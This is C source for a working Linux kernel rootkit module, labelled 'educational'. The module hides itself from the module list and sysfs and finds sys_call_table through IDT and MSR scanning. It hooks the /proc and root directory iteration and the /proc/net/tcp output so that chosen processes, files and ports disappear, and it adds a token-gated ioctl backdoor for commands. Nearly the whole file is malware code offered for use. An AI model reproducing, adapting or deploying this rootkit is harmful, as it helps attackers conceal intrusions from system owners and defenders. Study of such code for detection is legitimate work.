/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */

#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#if (LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 20))
    #include <linux/cred.h>
#endif
#include <linux/capability.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>
#include <linux/string.h>

#include "common.h"


static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
#define ITERATE_NAME readdir
#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
#define FILLDIR_VAR filldir
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
}
#else
static int (*proc_iterate)(struct file *file, struct dir_context *);
static int (*root_iterate)(struct file *file, struct dir_context *);
#define ITERATE_NAME iterate
#define ITERATE_PROTO struct file *file, struct dir_context *ctx
#define FILLDIR_VAR ctx->actor
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
    ret = ITERATE_FUNC(file, ctx);                  \
}
#endif

unsigned long *sys_call_table;

#define HIDE_PROC       1
#define UNHIDE_PROC     2
#define HIDE_TCP        3
#define UNHIDE_TCP      4
#define HIDE_FILE       5
#define UNHIDE_FILE     6
struct rk_args 
{
    unsigned short cmd;
    unsigned int args_len;
    char args[512];
}__attribute__((__packed__));

struct hidden_port {
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct hidden_file {
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

#if defined(_CONFIG_X86_)
static unsigned long *find_sys_call_table(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)search_linear(code, sizeof(code), "\xff\x14\x85", 3);

    if(p)
        return *(unsigned long **)((char *)p + 3);
    else
        return NULL;
}
#elif defined(_CONFIG_X86_64_)
static unsigned long *find_sys_call_table(void)
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)search_linear(code, sizeof(code), "\xff\x14\xc5", 3);

    if(p) {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);
        return sct;
    }
    else
        return NULL;
}
#endif

static void *get_inet_ioctl(int family, int type, int protocol )
{
    void *ret;
    struct socket *sock = NULL;

    if(sock_create(family, type, protocol, &sock))
        return NULL;

    ret = sock->ops->ioctl;

    sock_release(sock);

    return ret;
}

static void *get_vfs_iterate(const char *path)
{
    void *ret;
    struct file *filep;

    if((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = filep->f_op->ITERATE_NAME;
    
    filp_close(filep, 0);

    return ret;
}

static void *get_vfs_read(const char *path)
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->read;

    filp_close(filep, 0);

    return ret;
}

static void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0))
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    #elif (LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0))
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
    #else
    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
    #endif
    
    #if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    ret = afinfo->seq_show;
    #else 
    ret = afinfo->seq_ops.show;
    #endif

    filp_close(filep, 0);

    return ret;
}

static void hide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if(!hp)
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

static void unhide_tcp4_port(unsigned short port)
{
    struct hidden_port *hp;

    list_for_each_entry(hp, &hidden_tcp4_ports, list) {
        if(port == hp->port) {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static void hide_proc(unsigned short pid)
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if(!hp)
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

static void unhide_proc(unsigned short pid)
{
    struct hidden_proc *hp;

    list_for_each_entry(hp, &hidden_procs, list) {
        if(pid == hp->pid) {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static void hide_file(char *name)
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if(!hf)
        return;

    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

static void unhide_file(char *name)
{
    struct hidden_file *hf;

    list_for_each_entry(hf, &hidden_files, list) {
        if(!strcmp(name, hf->name)) {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

#define TMPSZ 150
static int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);

    list_for_each_entry(hp, &hidden_tcp4_ports, list) {
        sprintf(port, ":%04X", hp->port);
        if(strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int new_root_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list ) {
        if (!strcmp(name, hf->name) )
            return 0;
    }   

    return root_filldir(__buf, name, namelen, offset, ino, d_type);
}

static int new_root_iterate(ITERATE_PROTO)
{
    int ret;

    root_filldir = FILLDIR_VAR;

    hijack_pause(root_iterate);
    REPLACE_FILLDIR(root_iterate, new_root_filldir);
    hijack_resume(root_iterate);

    return ret;
}

static int new_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list ) {
        if ( pid == hp->pid )
            return 0;
    }

    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

static int new_proc_iterate(ITERATE_PROTO)
{
    int ret;

    proc_filldir = FILLDIR_VAR;

    hijack_pause(proc_iterate);
    REPLACE_FILLDIR(proc_iterate, new_proc_filldir);
    hijack_resume(proc_iterate);

    return ret;
}

static long new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
{
    int ret;
    struct rk_args rk_args;
    unsigned short pid;
    unsigned short port;
    char *file_name;

    if(cmd == AUTH_TOKEN)
    {
        DEBUG("Authenticated, receiving command\n");

        ret = copy_from_user(&rk_args, (void *)arg, sizeof(rk_args));
        if(ret)
            return 0;

        switch (rk_args.cmd)
        {
        case HIDE_PROC:
            pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
            DEBUG("Hiding process with PID %hu\n", pid);
            hide_proc(pid);
            break;
        
        case UNHIDE_PROC:
            pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
            DEBUG("Unhiding process with PID %hu\n", pid);
            unhide_proc(pid);
            break;

        case HIDE_TCP:
            port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
            DEBUG("Hiding TCP connection with port %hu\n", port);
            hide_tcp4_port(port);
            break;

        case UNHIDE_TCP:
            port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
            DEBUG("Unhiding TCP connection with port %hu\n", port);
            unhide_tcp4_port(port);
            break;

        case HIDE_FILE:
            file_name = kmalloc(rk_args.args_len + 1, GFP_KERNEL);
            if(!file_name)
                return 0;
            memcpy(file_name, rk_args.args, rk_args.args_len);

            DEBUG("Hiding file/directory with name %s\n", rk_args.args);
            hide_file(file_name);
            break;

        case UNHIDE_FILE:
            DEBUG("Hiding file/directory with name %s\n", rk_args.args);
            unhide_file(rk_args.args);
            break;
        
        default:
            break;
        }

        return 0;
    }

    hijack_pause(inet_ioctl);
    ret = inet_ioctl(sock, cmd, arg);
    hijack_resume(inet_ioctl);

    return ret;
}

static int __init rootkit_init( void )
{
    list_del_init(&__this_module.list);

    #if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    kobject_del(__this_module.mkobj.kobj.parent);
    #else 
    kobject_del(__this_module.holders_dir->parent);
    #endif

    sys_call_table = find_sys_call_table();

    DEBUG("sys_call_table obtained at %p\n", sys_call_table);

    proc_iterate = get_vfs_iterate("/proc");
    hijack_start(proc_iterate, &new_proc_iterate);

    root_iterate = get_vfs_iterate("/");
    hijack_start(root_iterate, &new_root_iterate);

    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hijack_start(tcp4_seq_show, &new_tcp4_seq_show);

    inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    hijack_start(inet_ioctl, &new_inet_ioctl);

    nf_hook_init();

    return 0;
}

static void __exit rootkit_cleanup( void )
{
    nf_hook_cleanup();
    hijack_stop(inet_ioctl);
    hijack_stop(tcp4_seq_show);
    hijack_stop(root_iterate);
    hijack_stop(proc_iterate);
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);

MODULE_LICENSE("GPLv2");
